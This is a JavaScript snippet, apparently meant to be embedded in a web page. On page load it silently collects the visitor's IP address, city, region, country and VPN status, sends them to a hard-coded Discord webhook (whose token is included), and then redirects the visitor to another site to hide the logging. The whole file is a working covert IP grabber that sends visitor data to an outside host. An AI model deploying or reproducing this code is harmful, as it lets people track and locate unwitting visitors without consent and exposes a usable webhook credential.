// Function to send IP info to Discord and redirect
function sendIPInfoAndRedirect() {
    // Get the user's IP address using an API
    fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const userIP = data.ip;

            // Define the Discord webhook URL
            const webhookURL = 'https://discord.com/api/webhooks/1167925331638886461/xcq_tIQR2IkZWNP7hNMqaX0MM6eFHo_teZFXpxPcsqkgaa1-Mo8o3iPlYAyfxhV-65Oa';

            // Gather additional IP information using an IP geolocation API
            fetch(`https://ipinfo.io/${userIP}/json`)
                .then(response => response.json())
                .then(ipInfo => {
                    // Check if IP is from a VPN
                    const isVPN = ipInfo.vpn === true;

                    // Get geographical location information
                    const location = ipInfo.city + ', ' + ipInfo.region + ', ' + ipInfo.country;

                    // Create a payload for the webhook with IP info
                    const payload = {
                        content: `User IP Address: ${userIP}\nIs VPN: ${isVPN ? 'Yes' : 'No'}\nLocation: ${location}`
                    };

                    // Send the payload to the Discord webhook
                    fetch(webhookURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(payload)
                    })
                        .then(() => {
                            console.log('IP info sent successfully to Discord webhook.');
                            // Redirect to "school.boxeth.uk" after sending IP info
                            window.location.href = 'https://school.boxeth.uk';
                        })
                        .catch(error => console.error('Error:', error));
                })
                .catch(error => console.error('Error:', error));
        })
        .catch(error => console.error('Error:', error));
}

// Send IP info and redirect when the website loads
window.onload = sendIPInfoAndRedirect;
